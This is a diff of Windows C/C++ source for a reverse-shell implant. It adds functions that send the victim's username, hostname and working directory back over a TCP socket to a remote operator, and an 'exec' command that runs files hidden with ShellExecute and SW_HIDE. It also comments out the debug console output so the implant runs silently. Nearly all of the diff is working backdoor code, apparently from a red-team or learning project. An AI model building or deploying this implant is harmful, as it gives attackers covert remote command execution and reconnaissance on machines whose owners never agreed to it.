@@ -9,19 +9,39 @@
 #define DEFAULT_BUFLEN 1024
 
 // Debug headers
-#include <iostream>
+// #include <iostream>
 
-// void exec(char* returnval, int returnsize, char *lx3fl3e)
-// {
-//     if (32 >= (int)(ShellExecute(NULL,"open", lx3fl3e, NULL, NULL, SW_HIDE))) //Get return value in int
-//     {
-//         strcat(returnval, "[x] Error executing file..\n");
-//     }
-//     else
-//     {
-//         strcat(returnval, "\n");
-//     }
-// }
+void exec(char* returnval, int returnsize, char *fileexec)
+{
+    // std::cout << fileexec << std::endl;
+    if (32 >= (int)(ShellExecute(NULL,"open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
+    {
+        strcat(returnval, "[x] Error executing command..\n");
+    }
+    else
+    {
+        strcat(returnval, "\n");
+    }
+}
+
+void whoami(char* returnval, int returnsize)
+{
+    DWORD bufferlen = 257;
+    GetUserName(returnval, &bufferlen);
+}
+
+void hostname(char* returnval, int returnsize)
+{
+    DWORD bufferlen = 257;
+    GetComputerName(returnval, &bufferlen);
+}
+
+void pwd(char* returnval, int returnsize) //Module 2
+{
+    TCHAR tempvar[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, tempvar);
+    strcat(returnval, tempvar);
+}
 
 void RevShell()
 {
@@ -39,30 +59,77 @@ void RevShell()
         exit(0);
     }
     else {
-        std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;
+        // std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;
         char CommandReceived[DEFAULT_BUFLEN] = "";
         while (true)
         {
             int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
-            std::cout << "Command received: " << CommandReceived;
-            std::cout << "Length of Command received: " << Result << std::endl;
-            if ((strcmp(CommandReceived, "whoami\n") == 0)) {
-                std::cout << "Command parsed: whoami" << std::endl;
-                //Execute a whoami() function
+            // std::cout << "Command received: " << CommandReceived;
+            // std::cout << "Length of Command received: " << Result << std::endl;
+            if ((strcmp(CommandReceived, "whoami") == 0)) {
+                char buffer[257] = "";
+                whoami(buffer,257);
+                strcat(buffer, "\n");
+                send(tcpsock, buffer, strlen(buffer)+1, 0);
+                memset(buffer, 0, sizeof(buffer));
+                memset(CommandReceived, 0, sizeof(CommandReceived));
             }
-            else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
-                std::cout << "Command parsed: pwd" << std::endl;
-                //Execute a pwd() function
+            else if ((strcmp(CommandReceived, "hostname") == 0)) {
+                char buffer[257] = "";
+                hostname(buffer,257);
+                strcat(buffer, "\n");
+                send(tcpsock, buffer, strlen(buffer)+1, 0);
+                memset(buffer, 0, sizeof(buffer));
+                memset(CommandReceived, 0, sizeof(CommandReceived));
             }
-            else if ((strcmp(CommandReceived, "exit\n") == 0)) {
-                std::cout << "Command parsed: exit";
-                std::cout << "Closing connection" << std::endl;
-                //Exit gracefully
+            else if ((strcmp(CommandReceived, "pwd") == 0)) {
+                char buffer[257] = "";
+                pwd(buffer,257);
+                strcat(buffer, "\n");
+                send(tcpsock, buffer, strlen(buffer)+1, 0);
+                memset(buffer, 0, sizeof(buffer));
+                memset(CommandReceived, 0, sizeof(CommandReceived));
+            }
+            else if ((strcmp(CommandReceived, "exit") == 0)) {
+                closesocket(tcpsock);
+                WSACleanup();
+                exit(0);
             }
             else {
-                std::cout << "Command not parsed!" << std::endl;
+                char splitval[DEFAULT_BUFLEN] = "";
+                for(int i=0; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
+                {
+                    if (CommandReceived[i] == *" ")    //CommandReceived[i] is a pointer here and can only be compared with a integer, this *" "
+                    {
+                        break;
+                    }
+                    else
+                    {
+                        splitval[i] = CommandReceived[i];
+                    }
+                }
+                if ((strcmp(splitval, "exec") == 0)) {
+                    char CommandExec[DEFAULT_BUFLEN] = "";
+                    int j = 0;
+                    for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
+                    {
+                        CommandExec[j] = CommandReceived[i];
+                        ++j;
+                    }
+                    char buffer[257] = "";
+                    exec(buffer, 257, CommandExec);
+                    strcat(buffer, "\n");
+                    send(tcpsock, buffer, strlen(buffer)+1, 0);
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
+                else {
+                    char buffer[20] = "Invalid Command\n";
+                    send(tcpsock, buffer, strlen(buffer)+1, 0);
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
             }
-            memset(CommandReceived, 0, sizeof(CommandReceived));
         }
     }
     closesocket(tcpsock);
